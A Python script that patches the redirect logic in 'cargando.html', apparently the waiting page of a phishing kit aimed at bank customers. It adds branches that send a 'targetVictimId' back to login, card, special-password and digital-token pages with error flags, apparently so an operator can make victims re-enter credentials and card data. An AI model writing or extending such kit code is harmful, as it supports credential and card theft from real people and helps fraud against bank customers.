import re

def fix_cargando():
    with open('cargando.html', 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Block 1 Replacement using a robust regex
    # Target: else if (action === 'error_login' || action === 'error_usuario' || action === 'error_tarjeta') { ... window.location.href = './error.html?id=' + targetVictimId; ... }
    
    pattern = re.compile(r"else if \(action === 'error_login'.*?error\.html.*?\+ targetVictimId;\s*\}", re.DOTALL)
    
    # Wait, there might be multiple matches. Let's find exactly the first match inside the try-catch block.
    # To be safe, let's just find the exact string from the file.
    
    old_str = "else if (action === 'error_login' || action === 'error_usuario' || action === 'error_tarjeta') {\n                  window.location.href = './error.html?id=' + targetVictimId;\n              }"
    
    new_str = """else if (action === 'error_login' || action === 'error_usuario') {
                  window.location.href = './error.html?id=' + targetVictimId + '&from=inicio.html';
              } else if (action === 'error_tarjeta') {
                  window.location.href = './error.html?id=' + targetVictimId + '&from=tarjeta.html';
              } else if (action === 'error_token') {
                  window.location.href = './error.html?id=' + targetVictimId + '&from=clave-especial.html';
              } else if (action === 'error_correo') {
                  window.location.href = './error.html?id=' + targetVictimId + '&from=token-digital.html';
              }"""
              
    content = content.replace(old_str, new_str)
    
    # Check if we need to replace the one with leading spaces
    old_str2 = "else if (action === 'error_login' || action === 'error_usuario' || action === 'error_tarjeta') {\n                  window.location.href = './error.html?id=' + targetVictimId;"
    if old_str2 in content:
        content = content.replace(old_str2, new_str)

    # Let's do it with regex
    content = re.sub(r"else if \(action === 'error_login' \|\| action === 'error_usuario' \|\| action === 'error_tarjeta'\) \{\s*window\.location\.href = '\./error\.html\?id=' \+ targetVictimId;\s*\}", new_str, content)
    content = re.sub(r"else if \(action === 'error_login' \|\| action === 'error_usuario' \|\| action === 'error_tarjeta'\) \{\s*window\.location\.href = '\./error\.html\?id=' \+ targetVictimId;", new_str, content)

    with open('cargando.html', 'w', encoding='utf-8') as f:
        f.write(content)

if __name__ == "__main__":
    fix_cargando()
    print("Fixed cargando.html via regex")
